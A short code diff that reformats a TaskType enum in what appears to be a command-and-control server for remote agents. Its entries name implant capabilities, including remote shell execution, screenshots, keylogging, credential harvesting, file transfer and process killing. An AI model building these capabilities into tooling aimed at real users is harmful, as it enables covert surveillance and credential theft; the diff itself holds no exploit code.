@@ -46,18 +46,18 @@ class TaskType(str, enum.Enum):
     
     Each type corresponds to a different agent capability.
     """
-    SHELL = "shell"              # Execute shell command
-    SCREENSHOT = "screenshot"     # Capture screenshot
-    KEYLOG_START = "keylog_start"    # Start keylogger
-    KEYLOG_STOP = "keylog_stop"     # Stop keylogger
-    KEYLOG_DUMP = "keylog_dump"     # Get keylog data
-    FILE_UPLOAD = "file_upload"     # Upload file to agent
-    FILE_DOWNLOAD = "file_download" # Download file from agent
-    FILE_LIST = "file_list"        # List directory contents
-    CREDENTIALS = "credentials"     # Harvest credentials
-    PROCESS_LIST = "process_list"   # List running processes
-    PROCESS_KILL = "process_kill"   # Kill a process
-    SLEEP = "sleep"              # Change sleep interval
+    SHELL = "shell"                    # Execute shell command
+    SCREENSHOT = "screenshot"          # Capture screenshot
+    KEYLOG_START = "keylog_start"      # Start keylogger
+    KEYLOG_STOP = "keylog_stop"        # Stop keylogger
+    KEYLOG_DUMP = "keylog_dump"        # Get keylog data
+    CREDENTIALS = "credentials"        # Harvest credentials
+    FILE_UPLOAD = "file_upload"        # Upload file to agent
+    FILE_DOWNLOAD = "file_download"    # Download file from agent
+    FILE_LIST = "file_list"            # List directory contents
+    PROCESS_LIST = "process_list"      # List running processes
+    PROCESS_KILL = "process_kill"      # Kill a process
+    SLEEP = "sleep"                    # Change sleep interval
 
 
 class Task(Base, TimeStampMixin):
